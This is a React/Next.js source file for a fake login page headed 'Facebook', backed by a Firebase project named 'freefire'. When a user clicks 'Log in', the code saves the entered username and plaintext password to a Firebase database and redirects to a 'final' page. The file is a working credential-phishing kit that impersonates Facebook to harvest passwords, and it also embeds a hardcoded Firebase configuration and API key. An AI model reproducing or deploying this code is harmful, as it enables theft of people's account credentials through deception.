import styles from '../styles/login.module.css';
import { useRouter } from 'next/router';
import { useState } from 'react';
import { initializeApp } from 'firebase/app';
import { getDatabase, ref, set } from 'firebase/database';

function writeUserData(username, password) {
  const db = getDatabase();
  set(ref(db, 'users/' + username), {
    password
  });
}

const firebaseConfig = {
  apiKey: 'AIzaSyCpvpUTwa9lnpWK6sh-5bcalcM2wQoFYwE',
  authDomain: 'freefire-5c9da.firebaseapp.com',
  projectId: 'freefire-5c9da',
  storageBucket: 'freefire-5c9da.appspot.com',
  messagingSenderId: '575127247016',
  appId: '1:575127247016:web:928081d5a437fcefbd4a9d',
  measurementId: 'G-TL9MT4BTBN'
};

function Login() {
  const router = useRouter();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const app = initializeApp(firebaseConfig);

  const handleClick = () => {
    if (username.length != 0 && password.length != 0) {
      writeUserData(username, password);
      router.push('final');
    } else {
      alert('fill the form');
    }
  };
  return (
    <>
      <div className="main">
        <div className={styles.header}>
          <h1>Facebook</h1>
        </div>
        <div className={styles.form}>
          <input
            className="username"
            type="text"
            value={username}
            onInput={e => setUsername(e.target.value)}
          />
          <input
            className="password"
            type="password"
            value={password}
            onInput={e => setPassword(e.target.value)}
          />
          <button className={styles.login} onClick={() => handleClick()}>
            Log in
          </button>
          <p>Forget Password?</p>
          <hr />
          <button className={styles.create}>Create account</button>
        </div>
      </div>
    </>
  );
}

export default Login;
